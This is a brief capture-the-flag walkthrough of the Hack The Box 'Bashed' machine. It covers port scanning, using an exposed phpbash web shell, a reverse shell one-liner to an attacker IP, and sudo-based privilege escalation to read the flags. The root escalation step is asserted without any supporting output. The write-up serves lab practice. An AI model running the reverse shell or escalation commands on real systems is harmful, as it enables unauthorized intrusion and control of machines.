# Bashed – Hack The Box
![Status](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![OSCP](https://img.shields.io/badge/OSCP-Recommended-blue)
![Linux](https://img.shields.io/badge/Target-Linux-yellow)

---

## 🧩 Overview
Bashed is a Linux machine emphasizing web enumeration, restricted shell abuse, and privilege escalation via sudo misconfigurations.

---

## 🔍 Enumeration

```bash
nmap -sCV -p- -oN nmap_bashed.txt 10.10.10.68
```

Key findings:
- **Port 80** running a web application called *phpbash*

---

## 🌐 Web Enumeration
Navigating to `/phpbash` gives an interactive shell-like interface.

---

## 🎯 Initial Foothold
Spawn a real shell:

```bash
bash -i >& /dev/tcp/10.10.16.5/4444 0>&1
```

---

## 🔼 Privilege Escalation

Check sudo:

```bash
sudo -l
```

User `www-data` can switch to `script`, then escalate:

```bash
sudo -u script /bin/bash
sudo -u root /bin/bash
```

---

## 🏆 Flags

```bash
cat /root/root.txt
cat /home/arrexel/user.txt
```

---

## 📌 Lessons Learned
- Always inspect `/phpbash` or dev shells.
- `sudo -l` often reveals simple escalation paths.
